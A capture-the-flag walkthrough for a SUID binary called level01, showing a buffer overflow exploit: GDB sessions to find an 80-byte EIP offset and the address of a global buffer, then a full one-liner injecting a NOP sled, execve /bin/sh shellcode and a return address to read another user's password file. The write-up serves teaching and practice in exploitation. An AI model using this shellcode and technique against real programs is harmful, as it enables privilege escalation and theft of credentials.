# Walkthrough - level01

The program contains SUID permissions for the user level02, which will allow us to obtain their flag.

## Disassembly

- Allocation of a 64-byte buffer on the stack
- A call to the `fgets` function with 256 bytes read from stdin
- A call to the `fgets` function with 100 bytes read from stdin

## Exploit

The goal is to store shellcode in the buffer `a_user_name`, then overwrite the EIP of the `main` function to jump directly to the shellcode.

First, as we can see in the `verify_user_name` function, there is a `memcpy(a_user_name, "dat_wil", 7)` which requires us to use the username `dat_wil`.

Next, we need to calculate the offset to be used in the second `fgets`.

[Buffer Overflow Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

This site generates a string that can be used in the second `fgets` with GDB to cause a segfault and calculate the offset to overwrite the EIP in `main`.

```bash
gdb ./level01
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

If we enter the segfault address (`0x37634136`)on the site, we get an offset of 80 bytes

Now we need to get the address of the variable `a_user_name` to know the address of the shellcode that we are going to inject.

```bash
gdb ./level01
(gdb) info variables
0x0804a040  a_user_name
```

There is the string `dat_wil` at the beginning of `a_user_name` so our shellcode will be at address `0x0804a040 + len("dat_wil") + 1 pour le \0 = 0x0804a048`


Let's construct the full command, adding some NOP instructions "\x90" before the shellcode to make it easier to land on it.

```bash
(python -c 'print("dat_wil" + "\x90" * 20 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'; python -c 'print("\x90" * 80 + "\x48\xa0\x04\x08")'; echo "cat /home/users/level02/.pass") | ./level01
```

[Shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html)